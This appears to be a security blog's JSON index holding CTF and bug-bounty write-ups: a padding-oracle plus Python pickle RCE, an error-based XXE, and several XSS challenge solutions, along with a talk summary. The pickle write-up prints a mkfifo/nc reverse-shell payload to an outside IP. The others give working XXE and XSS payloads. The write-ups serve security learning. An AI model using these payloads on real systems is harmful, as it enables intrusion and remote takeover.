[{"categories":["Challenges"],"content":"On the 1 CAT COMPANY CTF we didn’t manage to finalize our solution for the BabyPython challenge, created by Vahe Karapetyan, but one of our team members - Varik Matevosyan, solved it anyways after the time was up. Below is his write-up, enjoy! ","date":"28-11-2021","objectID":"/2021/11/cyhub-padding-oracle-pickle/:0:0","tags":["web security","CBC","python","cyhub","cryptography","pickles","deserialization"],"title":"BabyPython - \"1 CAT COMPANY CTF\" crypto and deserialization challenge","uri":"/2021/11/cyhub-padding-oracle-pickle/"},{"categories":["Challenges"],"content":"Analyzing the challenge One of the most interesting and difficult challenges on the 1Cat CTF was the “Baby Python”. In the challenge description we find a URL and a python file to download: endpoint: http://baby.2021.ctf.cyhub.am/ files: https://2021.ctf.cyhub.am/materials/securepickle.py Let’s first check the website. When we open the page we can see that each time it is giving us a random string. e.g. random stringrandom string \" random string After taking a look at the provided source code we see this a crypto challenge: import base64 import pickle from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from Crypto.Random import get_random_bytes class AESCipher: def __init__(self, key): self.key = pad(key.encode('utf-8'), AES.block_size) def encrypt(self, data): iv = get_random_bytes(AES.block_size) self.cipher = AES.new(self.key, AES.MODE_CBC, iv) return base64.b64encode(iv + self.cipher.encrypt(pad(data, AES.block_size))) def decrypt(self, data): raw = base64.b64decode(data) self.cipher = AES.new(self.key, AES.MODE_CBC, raw[:AES.block_size]) return unpad(self.cipher.decrypt(raw[AES.block_size:]), AES.block_size) class SecurePickle: \"\"\"Baby Devloper wanted to secure the pickle. Since it's not secure. Absolutely. Let's Encrypt\"\"\" def __init__(self, key): self.key = key self.encryptor = AESCipher(key) def loads(self, pickled_string): decrypted_string = self.encryptor.decrypt(pickled_string) return pickle.loads(decrypted_string) def dumps(self, object_to_pickle): encrypted_string = self.encryptor.encrypt(object_to_pickle) return encrypted_string def dumps2(self, object_to_pickle): pickled_string = pickle.dumps(object_to_pickle) encrypted_string = self.encryptor.encrypt(pickled_string) return encrypted_string ","date":"28-11-2021","objectID":"/2021/11/cyhub-padding-oracle-pickle/:0:1","tags":["web security","CBC","python","cyhub","cryptography","pickles","deserialization"],"title":"BabyPython - \"1 CAT COMPANY CTF\" crypto and deserialization challenge","uri":"/2021/11/cyhub-padding-oracle-pickle/"},{"categories":["Challenges"],"content":"Python pickle So the SecurePickle class is for loading decrypted pickles and for dumping encrypted ones. As eval is evil so is the pickle. So if we will be able to pass our payload to pickle.loads method it will execute our code. But we have 2 problems before moving forward: Where is the endpoint accepting user input and passing it into the pickle.loads sink? And the second one is that the strings are encrypted with CBC encryption, so we need a key to construct our payload, or do we? The first problem was solved pretty easily, we just ran a directory fuzzer, found /loads endpoint, then ran param miner and found out that it accepts ?obj= query parameter. Passing any encrypted string we got previously from the request to website root http://baby.2021.ctf.cyhub.am/, the page responds with a plaintext string test!. http://baby.2021.ctf.cyhub.am/loads?obj=x+u/CzCbuoRHIkNhAuvVYcTZrfVsq1zgSKxYfguM8UYpgwVPQAOMxvBfgwkIh7vz We can consider that this method decrypts the CBC message and passes it to pickle.loads function, so this surely is the source. ","date":"28-11-2021","objectID":"/2021/11/cyhub-padding-oracle-pickle/:0:2","tags":["web security","CBC","python","cyhub","cryptography","pickles","deserialization"],"title":"BabyPython - \"1 CAT COMPANY CTF\" crypto and deserialization challenge","uri":"/2021/11/cyhub-padding-oracle-pickle/"},{"categories":["Challenges"],"content":"Padding oracle attack As the first problem is solved, let’s find out whether or not we can construct a payload that will be decrypted by the server. After some googling, we found out that CBC encryption is vulnerable to Padding oracle attacks if it is padded by a random IV, which is true in this case. Here are some resources that helped us understand the attack: https://www.youtube.com/watch?v=aH4DENMN_O4 https://www.youtube.com/watch?v=7XZdsR0jHjo https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle TL;DR - an attacker can encrypt an arbitrary message without knowing the encryption key and that’s what we needed. ","date":"28-11-2021","objectID":"/2021/11/cyhub-padding-oracle-pickle/:0:3","tags":["web security","CBC","python","cyhub","cryptography","pickles","deserialization"],"title":"BabyPython - \"1 CAT COMPANY CTF\" crypto and deserialization challenge","uri":"/2021/11/cyhub-padding-oracle-pickle/"},{"categories":["Challenges"],"content":"PadBuster During further research, we also found a ready-to-go exploit by Aon’s Cyber Labs - PadBuster which is a Perl script that will automatically exploit the vulnerable server after passing some required arguments to it. padBuster.pl \u003cURL\u003e EncryptedSample BlockSize(16) -error 'PKCS#7 padding is incorrect.' -encodedtext 'our payload with malicious code' ","date":"28-11-2021","objectID":"/2021/11/cyhub-padding-oracle-pickle/:0:4","tags":["web security","CBC","python","cyhub","cryptography","pickles","deserialization"],"title":"BabyPython - \"1 CAT COMPANY CTF\" crypto and deserialization challenge","uri":"/2021/11/cyhub-padding-oracle-pickle/"},{"categories":["Challenges"],"content":"Exploit To generate the proper payload we should dump a string with pickle and encode it with base64: import pickle import base64 import os class Payload: def __reduce__(self): cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 54.212.140.241 4444 \u003e/tmp/f') return os.system, (cmd,) if __name__ == '__main__': pickled = pickle.dumps(Payload()) print(base64.urlsafe_b64encode(pickled)) This will open a reverse shell to our remote server at 54.212.140.241. So the final arguments for the script will be: perl padBuster.pl 'http://baby.2021.ctf.cyhub.am/loads?obj=X4Dpl9XXEOf5zaa3hyTFcfOkfxIFQ9BfgIwkuA3KNBu85ZOKRM1U4rIkEbxYL0qI' X4Dpl9XXEOf5zaa3hyTFcfOkfxIFQ9BfgIwkuA3KNBu85ZOKRM1U4rIkEbxYL0qI 16 -error \"PKCS#7 padding is incorrect.\" -encodedtext 'gASVbAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFFybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyA1NC4yMTIuMTQwLjI0MSA0NDQ0ID4vdG1wL2aUhZRSlC4=' After running the script and waiting about 30-40 minutes we get our encrypted message: Block 1 Results: [+] New Cipher Text (HEX): ade7fd36447b7b059ad590bb4f94df60 [+] Intermediate Bytes (HEX): 2de3685a447b7b059ad590374ae4b013 ------------------------------------------------------- ** Finished *** [+] Encrypted value is: ref9NkR7ewWa1ZC7T5TfYOMRK%2Fvi1bbhFMwDF52RGJo4VO%2FGV8i6LzWQOb4Xt6RPCE5u6tK79BOyMuPZKNb7eZHoMW8PLbFKu9ffqe3UqBZ3Ku5sqqvKIi0hr0yuSzIRB79ewBeca95BfXrZBXDUa83MgM9NNqc80d2pKODxcjYAAAAAAAAAAAAAAAAAAAAA ------------------------------------------------------- Now let’s set a Netcat listener at port 4444 nc -l 4444 and pass the payload to the server: http://baby.2021.ctf.cyhub.am/loads?obj=ref9NkR7ewWa1ZC7T5TfYOMRK%2Fvi1bbhFMwDF52RGJo4VO%2FGV8i6LzWQOb4Xt6RPCE5u6tK79BOyMuPZKNb7eZHoMW8PLbFKu9ffqe3UqBZ3Ku5sqqvKIi0hr0yuSzIRB79ewBeca95BfXrZBXDUa83MgM9NNqc80d2pKODxcjYAAAAAAAAAAAAAAAAAAAAA As soon as the page is opened we get our reverse shell and reading the environment variables, we find the long-awaited flag: FLAG=cyhub{0244a2ac3d93327dbf77c19a36ef4851000000000}success \" FLAG=cyhub{0244a2ac3d93327dbf77c19a36ef4851000000000} ","date":"28-11-2021","objectID":"/2021/11/cyhub-padding-oracle-pickle/:0:5","tags":["web security","CBC","python","cyhub","cryptography","pickles","deserialization"],"title":"BabyPython - \"1 CAT COMPANY CTF\" crypto and deserialization challenge","uri":"/2021/11/cyhub-padding-oracle-pickle/"},{"categories":["Challenges"],"content":"On November 27 Cyhub Armenia organized a very fun local CTF event - 1 CAT COMPANY CTF and Hayk Andriasyan created an XXE challenge for it. As a task description, we get only the website location: task descriptiontask description \" task description Visiting which we see nothing helpful, so we run our web fuzzer with a generic wordlist and get some interesting endpoints - /health, a health service actuator endpoint, /test some spring endpoint which throws java error containing script’s full path, /api, which returns 403 forbidden response. path disclosurepath disclosure \" path disclosure Combing what we got - task’s name clearly referring to Orange Tsai, NginX server, we can clearly understand we must have NginX off by slash directory traversal vulnerability, so we try traversing to /api endpoint discovered before and succeed api endpointapi endpoint \" api endpoint Fuzzing for the obvious {path}, we find /api/data endpoint which expects XML body api/data endpointapi/data endpoint \" api/data endpoint So we try to exploit the XXE accessing external services via http/https and getting blocked by the parser, accessing external ftp server via file protocol and failing. But we see quickly the difference between existent and non existent file paths. When the server responds Your XML is valid the file exists and /somepath (No such file or directory) when it doesn’t. successfull file readsuccessfull file read \" successfull file read failed file readfailed file read \" failed file read Then we realize that the only way to exfiltrate the data is through exploiting xxe with local dtd files. After trying some known gadgets we fail, so we should find a gadget ourselves. To do so we run a FreeBSD VM, as we know Antranig Vartanian, who is hosting the challenges, is a huuge FreeBSD fan and contributor, installing most probable maven dependencies like spring boot and jetty. And to find local dtd files we run the dtd finder tool made by GoSecure in our home directory with the following command. java -jar dtd-finder-1.1-all.jar /home/tmp-user/.m2/ \u003e out Which yields the following results: /.m2/repository/org/eclipse/jetty/jetty-xml/9.4.31.v20200723/jetty-xml-9.4.31.v20200723.jar!/org/eclipse/jetty/xml/configure_9_0.dtd /.m2/repository/org/eclipse/jetty/jetty-xml/9.4.31.v20200723/jetty-xml-9.4.31.v20200723.jar!/org/eclipse/jetty/xml/configure_7_6.dtd /.m2/repository/org/eclipse/jetty/jetty-xml/9.4.31.v20200723/jetty-xml-9.4.31.v20200723.jar!/org/eclipse/jetty/xml/configure_9_3.dtd /.m2/repository/org/eclipse/jetty/jetty-xml/9.4.31.v20200723/jetty-xml-9.4.31.v20200723.jar!/org/eclipse/jetty/xml/configure_6_0.dtd To find which jetty version the server is using, we pull the repo, extract version tags, feed it to Burp’s Intruder and find that it is using 9.3.3.v20150827 intruder windowintruder window \" intruder window We choose configure_6_0.dtd file to create our gadget as we have a perfect candidate CONFIG, which gets reflected few lines after. configure_6.0.dtdconfigure_6.0.dtd \" configure_6.0.dtd To create the gadget we should escape CONFIG reflection on line 41 \u003c!ENTITY % CONFIG 'Set|Get|Put|Call|New|Ref|Array|Map|Property)*\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"file:///usr/home/app/\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///nonexistent/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT asd ('\u003e Sending the payload we get directory listing for the /usr/home/app/ folder initial payloadinitial payload \" initial payload Finally, in .extraverysupErSEcr3Tfolder folder, we find flag.txt cyhubctf{error_based_xxe_with_orange_tsai}flag \" cyhubctf{error_based_xxe_with_orange_tsai} Thanks Cyhub for such a great event !. ","date":"28-11-2021","objectID":"/2021/11/cyhub-off-by-slash-xxe/:0:0","tags":["web security","xxe gadget","java","cyhub","xxe","nginx","off-by-slash"],"title":"OrangeSite - \"1 CAT COMPANY CTF\" spring xxe challenge","uri":"/2021/11/cyhub-off-by-slash-xxe/"},{"categories":["Challenges"],"content":"Intigiriti’s November challenge by IvarsVids was about a Vue.js one-pager that reflected user input with some replacements. After visiting the challenge homepage at https://challenge-1121.intigriti.io/ we quickly notice it reflects s query parameter not escaping HTML less than and greater than signs resulting in HTML injection. s parameter reflections parameter reflection \" s parameter reflection But the page refuses the execute the injected script because of the content security policy base-uri 'self'; default-src 'self'; script-src 'unsafe-eval' '\u003cemitted\u003e' 'strict-dynamic'; object-src 'none'; style-src '\u003cemitted\u003e' CSP blockingCSP blocking \" CSP blocking As we see unsafe-eval directive is present, which means dynamically eval’ed script will be allowed, so we can try vue.js template injection. To achieve that we should inject our element with app “id”, close the \u003ctitle\u003e with a payload like \u003c/title\u003e\u003cdiv id=app\u003e\u003c/div\u003e and inject the payload within the div. Template delimiters are set to v-{{ and }} on line 45 but after trying to inject templates or general script gadgets from Portswigger’s cheatsheet the WAF is replacing keywords with % characters. replacing keywordsreplacing keywords \" replacing keywords Looking for a potential execuntion sink I refered to Vue api at https://vuejs.org/v2/api/ and found slot-scope deprecated special attribute which is expecting function argument expression. Trying to inject payload like \u003c/title\u003e\u003cdiv id=app\u003e\u003cp slot-scope=\"function(){alert()}\"\u003e\u003c/div\u003e we get the following expection. thrown exceptionthrown exception \" thrown exception So to execute javascript we should close the function expression and then execute our javascript code, but also please note the injection point is within a smaller scope and window parameters are not within this scope. To escape to window scope we can try the classic this.constructor.constructor chain. Injecting a payload like the following we get another exception\u003c/title\u003e\u003cdiv id=\"app\"\u003e\u003cp slot-scope=\"){}}])-this.constructor.constructor('alert(origin)')()})};//\"\u003e\u003c/div\u003e thrown exception 2thrown exception 2 \" thrown exception 2 WAF has replaced is from this with %is% as it is another known script gadget attribute, but we can bypass this using a function from the local scope, e.g. \u003c/title\u003e\u003cdiv id=\"app\"\u003e\u003cp slot-scope=\"){}}])-_c.constructor.constructor('alert(origin)')()})};//\"\u003e\u003c/div\u003e successfull executionsuccessfull execution \" successfull execution For the intended solution check Intigriti’s guide at https://www.youtube.com/watch?v=-_7uL7l0qZk. ","date":"22-11-2021","objectID":"/2021/11/vuejs-script-gadget-intigriti/:0:0","tags":["web security","script gadget","xss","intigriti","vuejs"],"title":"From Intigriti challenge to a Vue.js script gadget","uri":"/2021/11/vuejs-script-gadget-intigriti/"},{"categories":["Challenges"],"content":"This month’s challenge, made by Holme, was a little bit different than the ones I have previously solved as it had a server-side processing issue. Vulnerable page - https://challenge-0221.intigriti.io/ Vulnerable script - https://challenge-0221.intigriti.io/script.js ","date":"22-02-2021","objectID":"/2021/02/intigriti-february-xss-challenge/:0:0","tags":["challenge","xss","intigriti","unicode","eval","DOM clobbering"],"title":"Intigriti's February XSS Challenge Writeup","uri":"/2021/02/intigriti-february-xss-challenge/"},{"categories":["Challenges"],"content":"Issue 1 - Unicode characters improper processing Digging into the embedded script (see the code below) we can see there is no direct source that could reach the only dangerous sink (eval) at line 57: function startGrade() { var text = document.getElementById(\"assignmentText\").value; checkLength(text); result = window.result || { message: \"Your submission is too short.\", error: 1, }; //If the result object hasn't been defined yet, the submission must be too short if (result.error) { endGrade(); } else { getQAnswer(); if (!passQuiz()) { result.message = \"We don't allow robots at the Unicodeversity (yet)!\"; result.error = 1; } else { result.grade = \"ABCDEF\"[Math.floor(Math.random() * 6)]; //Don't tell the students we don't actually read their submissions } endGrade(); } } function endGrade() { document.getElementById(\"message\").innerText = result.message; if (result.grade) { document.getElementById( \"grade\" ).innerText = `You got a(n) ${result.grade}!`; } document.getElementById(\"share\").style.visibility = \"initial\"; document.getElementById( \"share-link\" ).href = `https://challenge-0221.intigriti.io/?assignmentTitle=${ document.getElementById(\"assignmentTitle\").value }\u0026assignmentText=${document.getElementById(\"assignmentText\").value}`; delete result; } function checkLength(text) { if (text.length \u003e 50) { result = { message: \"Thanks for your submission!\" }; } } function getQAnswer() { var answer = document.getElementById(\"answer\").value; if (/^[0-9]+$/.test(answer)) { if (typeof result !== \"undefined\") { result.questionAnswer = { value: answer }; } else { result = { questionAnswer: { value: answer } }; } } } function passQuiz() { if (typeof result.questionAnswer !== \"undefined\") { return eval(result.questionAnswer.value + \" == \" + question); } return false; } var question = `${Math.floor(Math.random() * 10) + 1}+ ${ Math.floor(Math.random() * 10) + 1 }`; document.getElementById(\"question\").innerText = `${question}= ?`; document.getElementById(\"submit\").addEventListener(\"click\", startGrade); const urlParams = new URLSearchParams(location.search); if (urlParams.has(\"autosubmit\")) { startGrade(); } It is a common behavior for web apps to reflect an input’s name or id if provided via request body or query string, so does this app (escaping, unfortunately). Escaped reflected parameterEscaped reflected parameter \" Escaped reflected parameter But if we try a Unicode sequence (բարև), we can see it doesn’t get processed normally. Unicode reflected parameterUnicode reflected parameter \" Unicode reflected parameter The first part of a Unicode character byte pair gets rendered and the second pair is getting reflected as is, for example, in the case of letter բ (U+0562), 05 gets rendered and 62 is being returned. ","date":"22-02-2021","objectID":"/2021/02/intigriti-february-xss-challenge/:0:1","tags":["challenge","xss","intigriti","unicode","eval","DOM clobbering"],"title":"Intigriti's February XSS Challenge Writeup","uri":"/2021/02/intigriti-february-xss-challenge/"},{"categories":["Challenges"],"content":"Issue 2 - DOM clobbering as a source to the dangerous sink Now we can escape the reflection point with a doublequote using some character like ∀ (U+2200), but we cannot use event handlers because of CSP nor can construct an inline script element as we cannot guess a server-generated nonce value. script-src 'strict-dynamic' 'nonce-iR/JMMPv7suDLRND7rsPGvDzJxU=' 'unsafe-eval' http: https:;object-src 'none';base-uri 'none'; As said above, looking for DOM vulnerabilities, the only usable sink is eval (at line 56 in the original script) in passQuiz function. function passQuiz() { if (typeof result.questionAnswer !== \"undefined\") { return eval(result.questionAnswer.value + \" == \" + question); } return false; } And to reach it we should be able to control either result.questionAnswer.value or question variable. No source reaches question, but in line 4 we can see that result can be taken from the window object. function startGrade() { var text = document.getElementById(\"assignmentText\").value; checkLength(text); result = window.result || { message: \"Your submission is too short.\", error: 1, So to set its value we should abuse DOM clobbering. And the rendered payload should look something like this \u003celem id=\"result\"\u003e \u003celem id=\"result\" name=\"questionAnswer\" value=\"alert(origin)//\"\u003e Looking through MDN documentation, the only usable element that has value attribute is \u003cdata\u003e as only its first two letters (da) can be embedded as a hexadecimal value to start a tag normally instead of a gibberish. Finally we can construct our payload ?assignmentTitle=∀㸀㳚ta%20id=result㸀㳚ta%20id=result%20name=questionAnswer%20value=alert(origin)//\u0026autosubmit ∀ (U+2200) to render a doublequote (\"), 㸀 (U+3E00) to render a greater than sign (\u003e), 㳚 (U+3CDA) to render a less than sign (\u003c) and reflect DA characters to start the \u003cdata\u003e tag, and autosubmit query parameter to execute startGrade function without user interaction (line 71). Which should result in something like this being injected into the page \"00\u003e00\u003cdata id=result\u003e00\u003cdata id=result name=questionAnswer value=alert(origin)// Pop the alertPop the alert \" Pop the alert The final URL - https://challenge-0221.intigriti.io/?assignmentTitle=∀㸀㳚ta%20id=result㸀㳚ta%20id=result%20name=questionAnswer%20value=alert(origin)//\u0026autosubmit ","date":"22-02-2021","objectID":"/2021/02/intigriti-february-xss-challenge/:0:2","tags":["challenge","xss","intigriti","unicode","eval","DOM clobbering"],"title":"Intigriti's February XSS Challenge Writeup","uri":"/2021/02/intigriti-february-xss-challenge/"},{"categories":["Conferences"],"content":"At this year’s Armsec seventh annual information security conference - reARMSEC, I made a small presentation (Google slides, PDF version) on why the modern web is hard describing HackerOne’s top 10 most impactful and rewarded vulnerability types for 2020. As for the real-life examples of the bugs, I gathered reports mostly from HackerOne’s Hacktivity. XSS (Cache Poisoning): HackerOne report #394016, XSS on Discourse by Sergey Bobrov HackerOne report #415168, XSS on QIWI by Sergey Bobrov XSS (DOM): XSS on Google Search (closure), mXSS by Masato Kinugawa serialization bug in \u003cnoscript\u003e by Michał Bentkowski HackerOne report #876148, DOM XSS on DuckDuckGo by Predrag Cujanović uXSS: Semi Universal XSS affecting Firefox for iOS, CVE-2019-17004 by Cliqz uXSS in Chrome on iOS, CVE-2018-6128 by Tomasz Bojarski Electron: Microsoft Teams zero click xss by Oskars Vegeris Discord RCE by Masato Kinugawa (not in slides, but definitely a must read) AAA vulnerabilities: Exploiting e-mail systems by Inti De Ceukelaire HackerOne report #493324, privilege escalation to gitlab admin by Anton Subbotin Facebook Access Token Security Breach (30 million accounts) by 👻 HackerOne report #605720, vertical privilege escalation on HackerOne by Vladimir Metnew HackerOne report #663431, IDOR on HackerOne by Jobert Abma Facebook account takeover via recovery code bruteforce by Anand Prakash Information Disclosure: HackerOne report #396467, Snapchat’s github token leaked publicly by Majd HackerOne report #885539, Twitter private list members disclosure via GraphQL by RyotaK HackerOne report #489146, confidential data of users and limited metadata of programs and reports accessible via GraphQL on HackerOne by Yash Sodha (not in slides, but definitely a must read) SSRF: HackerOne report #347139, LFI and SSRF via XXE on Rockstar Games by Alex Birsan HackerOne report #923132, redirect SSRF on Dropbox by Sayaan Alam HackerOne report #541169, SSRF via DNS rebinding on Gitlab by Alex Chapman HackerOne report #530974, Server-Side Request Forgery using Javascript on Snapchat by Ben Sadeghipour CSRF: HackerOne report #1010522, TikTok Careers Portal Account Takeover via CSRF by Lauritz SSTI: HackerOne report #125980, RCE via Flask Jinja2 Template Injection on Uber by Orange Tsai Insecure Deserialization: RCE on Facebook by Orange Tsai SQL injection: HackerOne report #137956, Error based SQL injection on Mail.ru by Vahagn Israelian HackerOne report #10037, Boolean based SQL injection on Mail.ru by Vahagn Vardanian HackerOne report #786044, Time based SQL injection on Mail.ru by Austin Augie HackerOne report #852306, SQLI Wildcard Injection on Mail.ru by Alexey (bazzy) To learn more (I’ll try to update this list constantly): Books - Web Application Hacker’s Handbook, Web Hacking 101, The Tangled Web, The Art of Software Security Assessment Writeups - HackerOne’s Hacktivity, bugcrowd’s CrowdStream, CTFtime.org writeups Labs - PortSwigger Web Security Academy, TryHackMe, hackxor, OverTheWire: Wargames Follow these people/pages - https://twitter.com/davwwwx/following ","date":"27-12-2020","objectID":"/2020/12/armsec-2020/:0:0","tags":["web security","bug bounties","hackerone","owasp","top 10","conferences"],"title":"Web is hard, reARMSEC aka ARMSec 2020","uri":"/2020/12/armsec-2020/"},{"categories":["Challenges"],"content":"This month’s Intigriti’s XSS challenge was interesting as a couple of hours after Frans Rosén submitted an unintended solution, and I got interested in that one more than in the original. Unintended SolutionUnintended Solution by Frans Rosen \" Unintended Solution Challenge on webarchive https://web.archive.org/web/20201208103813/https://challenge-1220.intigriti.io/. Vulnerable script on webarchive https://web.archive.org/web/20201210000939/https://challenge-1220.intigriti.io/script.js. ","date":"14-12-2020","objectID":"/2020/12/intigriti-december-xss-challenge/:0:0","tags":["challenge","xss","intigriti","eval","unintended"],"title":"Intigriti's December XSS Challenge Writeup","uri":"/2020/12/intigriti-december-xss-challenge/"},{"categories":["Challenges"],"content":"Solution 1 Parsing query parameters using custom function (e.g. getQueryVariable, line 3) allows to specify those in URL hash on line 11 (below) window.location.href.substr(...), as String.prototype.indexOf() is looking for the first occurance of ? (question mark): function init(){ try{ document.getElementById(\"result\").value = calc(getQueryVariable(\"num1\"), getQueryVariable(\"num2\"), getQueryVariable(\"operator\")); } catch(ex){ console.log(ex); } } ... function getQueryVariable(variable) { window.searchQueryString = window.location.href.substr(window.location.href.indexOf(\"?\") + 1, window.location.href.length); var vars = searchQueryString.split('\u0026'); var value; for (var i = 0; i \u003c vars.length; i++) { var pair = vars[i].split('='); if (decodeURIComponent(pair[0]) == variable) { value = decodeURIComponent(pair[1]); } } return value; } Two of the sources (num1 and num2) are passed to setNumber function (line 23) when clicking on a number, which itself then passes it to parseInt (lines 101, 104), also there is no protection against iframing it, so, having such URL https://challenge-1220.intigriti.io/#?num1=parseInt\u0026operator=%3d\u0026num2=eval in an iframe, we can execute parseInt=eval as operation in the context of the vulnerable webpage, because = is whitelisted as an operator: const operators = [\"+\", \"-\", \"/\", \"*\", \"=\"]; function calc(num1 = \"\", num2 = \"\", operator = \"\"){ operator = decodeURIComponent(operator); var operation = `${num1}${operator}${num2}`; document.getElementById(\"operation\").value = operation; if(operators.indexOf(operator) == -1){ throw \"Invalid operator.\"; } if(!(/^[0-9a-zA-Z-]+$/.test(num1)) || !(/^[0-9a-zA-Z]+$/.test(num2))){ throw \"No special characters.\" } if(operation.length \u003e 20){ throw \"Operation too long.\"; } return eval(operation); } ... window.onload = function(){ init(); var numberBtns = document.body.getElementsByClassName(\"number\"); for(var i = 0; i \u003c numberBtns.length; i++){ numberBtns[i].onclick = function(e){ setNumber(e.target.innerText) }; }; var operatorBtns = document.body.getElementsByClassName(\"operator\"); for(var i = 0; i \u003c operatorBtns.length; i++){ operatorBtns[i].onclick = function(e){ setOperator(e.target.innerText) }; }; var clearBtn = document.body.getElementsByClassName(\"clear\")[0]; clearBtn.onclick = function(){ clear(); } } ... function setNumber(number){ var url = new URL(window.location); var num1 = getQueryVariable('num1') || 0; var num2 = getQueryVariable('num2') || 0; var operator = getQueryVariable('operator'); if(operator == undefined || operator == \"\"){ url.searchParams.set('num1', parseInt(num1 + number)); } else if(operator != undefined){ url.searchParams.set('num2', parseInt(num2 + number)); } window.history.pushState({}, '', url); init(); } Now we can redirect the iframe to a new hash https://challenge-1220.intigriti.io/#?num1=parseInt\u0026operator=%3d\u0026num2=alert(document.domain)// and as, only, the URL hash is changed, no request is going to be sent to the server and if the user hits any number, the following script will be executed alert(document.domain)//\u003cnumber\u003e. A similar technique can be leveraged when having calc=eval executed then redirecting to a new hash https://challenge-1220.intigriti.io/#?num1=alert(document.domain)\u0026operator=%3d\u0026num2=eval, where the user has to hit an operator POCs: for numbers - https://jsfiddle.net/td6yzm0w/1/ for operators - https://jsfiddle.net/td6yzm0w/ Intigriti tip tweetIntigriti tip tweet \" Intigriti tip tweet ","date":"14-12-2020","objectID":"/2020/12/intigriti-december-xss-challenge/:0:1","tags":["challenge","xss","intigriti","eval","unintended"],"title":"Intigriti's December XSS Challenge Writeup","uri":"/2020/12/intigriti-december-xss-challenge/"},{"categories":["Challenges"],"content":"Solution 2 Now the intended one, that leads to DOM XSS (Cross site swagging) with no user interaction. Intigriti tip tweetIntigriti tip tweet \" Intigriti tip tweet Very right, because getQueryVariable iterates in a loop and takes the value of the last occurrence of the requested parameter (lines 5-10) function getQueryVariable(variable) { window.searchQueryString = window.location.href.substr(window.location.href.indexOf(\"?\") + 1, window.location.href.length); var vars = searchQueryString.split('\u0026'); var value; for (var i = 0; i \u003c vars.length; i++) { var pair = vars[i].split('='); if (decodeURIComponent(pair[0]) == variable) { value = decodeURIComponent(pair[1]); } } return value; } Chain: https://challenge-1220.intigriti.io/?num1=onhashchange\u0026operator=%3d\u0026num2=init\u0026#d\u0026 - execute onhashchange=init https://challenge-1220.intigriti.io/?num1=onhashchange\u0026operator=%3d\u0026num2=init\u0026#d\u0026num1=calc\u0026num2=eval - changing hash, triggering onhashchange which is init now and executing calc=eval https://challenge-1220.intigriti.io/?num1=onhashchange\u0026operator=%3d\u0026num2=init\u0026#d\u0026num1=calc\u0026num2=eval\u0026num1=alert(‘achievement%20unlocked:%20unlimited%20swag%20vouchers%20’%2bdocument.domain) - triggering onhashchange and passing alert('achievement unlocked: unlimited swag vouchers '+document.domain) to eval Now you can claim your unlimited swag voucher with 0 click: Pop an alertPop an alert \" Pop an alert POC: https://jsfiddle.net/vsz08bpo/ ","date":"14-12-2020","objectID":"/2020/12/intigriti-december-xss-challenge/:0:2","tags":["challenge","xss","intigriti","eval","unintended"],"title":"Intigriti's December XSS Challenge Writeup","uri":"/2020/12/intigriti-december-xss-challenge/"},{"categories":["Misc"],"content":"Hi, I am a web application developer and cybersecurity enthusiast from Armenia. On this blog, I am going to post mainly Bug bounty and CTF writeups, reconnaissance techniques, approaches to pentesting and my thoughts on general infosec. Stay tuned for more. ","date":"15-09-2020","objectID":"/2020/09/what-is-this-blog-about/:0:0","tags":["about","blog"],"title":"What is this blog about","uri":"/2020/09/what-is-this-blog-about/"},{"categories":null,"content":"poke  Telegram @davwwwx  Twitter @davwwwx  Github @davwwwx ","date":"15-09-2020","objectID":"/about/:0:0","tags":null,"title":"about:blank","uri":"/about/"}]